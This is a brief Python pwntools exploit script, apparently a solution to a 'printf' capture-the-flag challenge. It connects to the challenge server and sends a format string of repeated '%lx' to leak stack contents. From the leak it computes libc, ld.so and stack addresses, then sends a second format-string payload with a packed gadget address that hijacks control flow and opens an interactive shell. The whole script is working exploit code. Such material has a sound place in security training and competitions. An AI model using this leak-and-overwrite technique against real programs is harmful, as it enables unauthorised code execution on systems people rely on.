from pwn import *

#p = process("./printf-60b0fcfbbb43400426aeae512008bab56879155df25c54037c1304227c43dab4")
p = remote("printf.chal.ctf.westerns.tokyo",10001)

#raw_input()
p.sendafter("name?","%lx "*36)
k = p.recvline()
k = p.recvline()
k = p.recvline()

k = k.split(" ")

libcbase = int(k[2],16) - 0x10d024
tmp = int(k[2],16) - 0xe8024
input_stack = int(k[-6],16)
ld_so = libcbase+0x619000
stack_base = input_stack - 0xf6


print hex(libcbase)

print hex(input_stack)

print k

#raw_input()
pay = "%"+str(stack_base - (libcbase+0x1e66c8+0x200-0x70)) + "c" + "B"*0x7+p64(libcbase+0xe2383)
#print pay
p.sendlineafter("?",pay)


p.interactive()
#__run_exit_handlers+314
